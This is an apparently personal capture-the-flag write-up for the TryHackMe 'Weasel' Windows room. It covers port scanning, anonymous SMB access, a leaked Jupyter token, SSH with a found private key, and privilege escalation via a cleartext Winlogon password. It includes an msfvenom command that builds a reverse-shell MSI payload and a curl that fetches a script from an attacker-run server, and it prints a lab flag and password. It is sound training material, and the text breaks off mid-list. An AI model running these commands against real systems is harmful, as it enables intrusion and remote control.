`solution = https://www.youtube.com/watch?v=2Jv957vQhS4`

# Weasel
`url = https://tryhackme.com/room/weasel`
`date = 05/28/2023`

## Enumeration
---

1. **Network Enumeration**

* We can see that ports `22`, `135`, `139`, `445` & `3389` are open:
```bash
    22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
    135/tcp  open  msrpc         Microsoft Windows RPC
    139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
    445/tcp  open  microsoft-ds?
    3389/tcp open  ms-wbt-server Microsoft Terminal Services
```
* We now know that this is a windows machine. Port `3389` suggests that remote desktop services are open. The other ports are just other services that RDP might require like net-bios or msrpc.

* No website hosted - port `80`. But there's ssh open so that's that.

* The `all_ports` scan shows a few other tings like:
```bash
    Host script results:
    | smb2-security-mode: 
    |   311: 
    |_    Message signing enabled but not required
    | smb2-time: 
    |   date: 2023-05-28T04:09:13
    |_  start_date: N/A
```
2. **SMB Enumeration**

* Running the command --
```bash
smbclient --no-pass -L $IP
# No pass to login without a pass
# -L for listing the services on the client
```
The output is:
```bash
    Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	datasci-team    Disk      
	IPC$            IPC       Remote IPC
```
*Note -- This is my first Windows machine, so I am being explicit with all steps.*

* Now using a the same command, but with a little different syntax, we can see the insides of the file system `smbclient --no-pass //$IP/datasci-team`.

* This will open the promppt `smb: \>` where we can interact with this client. I can see different files, that are hosted on this server. I am using the `get` command to get the files that I find interesting:

```
BI002_2613_Cz-40-2_Acta-T34-nr25-347-359_o.pdf
Dillard_Living_Like_Weasels.pdf
'Long-Tailed_Weasel_Range_-_CWHR_M157_[ds1940].csv'
requirements.txt
weasel.ipynb
jupyter-token.txt
weasel.txt
```
* Port `8888` is not seen anywhere in the network scans, however, since there is a `jupyter-token.txt` file in the smb-share, a few things become clear.
    - Port `8888` is a port used for jupyter notebooks. going to `http://$IP:8888` will give us access to the jupyter page.
    - Jupyter can serve notebooks on a server just like any other file server. Users are required to login. `jupyter notebook list` will show the available notebooks.

## Exploitation & Post Exploitation
---

* **Jupyter Shell**
    - We can access this Windows machine using the shell on jupyter's web-page.
    - We can truly enumerate this machine from here now. We are greeted with the home directory of the jupyter system user. This is just like www-data. Out of the many files in the directory, one of the important ones is: `dev-datasci-lowpriv_id_ed25519`, which is a private key.
    - Now we can get this file & ssh into it.
* **Windows Shell**
    - Change the perms for the private key to 600 & then ssh into it : `ssh -i id_ed25519 dev-datasci-lowpriv@$IP`.
    - This gives us a windows shell. The windows machine can now be enumerated for more intel.
    - Now we can go to the desktop & cat out the user flag which is found here - `C:\Users\dev-datasci-lowpriv\Desktop` using the more command - `more user.txt`. We get `THM{w3as3ls_@nd_pyth0ns}`.

## PrivEsc

 * **WinPEAAS**
    - We can get winPEAAS from here - `https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/WinPeas.ps1`.
    - Performing curl is not working, hence we can do the python server method : `curl http://10.6.36.128:8000/a.ps1 --output a.ps1`.
    - I spent a day & I thought instead of winPEAAS I should try privescCheck.

 * **PrivescCheck**
```bash
+------+------------------------------------------------+------+       
| TEST | CREDS > WinLogon                               | VULN |       
+------+------------------------------------------------+------+       
| DESC | Parse the Winlogon registry keys and check whether    |       
|      | they contain any clear-text password. Entries that    |       
|      | have an empty password field are filtered out.        |       
+------+-------------------------------------------------------+       
[*] Found 1 result(s).


Domain   : DEV-DATASCI-JUP
Username : dev-datasci-lowpriv
Password : wUqnKWqzha*W!PWrPRWi!M8faUn
```

* PrivescCheck returns this output which shows leaked creds for the `dev-datasci-jup` user to be `wUqnKWqzha*W!PWrPRWi!M8faUn`.
* The solution video also talks about "always elevated" privs. For exploiting this we can get a `.msi` payload from msfvenom using the command:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LOCAL_IP LPORT=$LOCAL_P -f msi > buttstabber.msi
```


## Explaination Time !!
---

1. The main vulnerability here is that the smb server running has no password enabled.

2. Through this we could enumerate the file system & get access to a jupyter-token file.

3. It is through this file that we know, that a jupyter server is being run on the system on `port 8888`.

4. Visiting this page, we can access this server using the token.

5. Using the terminal we are logged in as the `dev-datasci@DEV-DATASCI-JUP` user which is a system user. However, it has the `uid = 1000` which does not make sense to me. Maybe this user has been created by the sys-adm.

6. 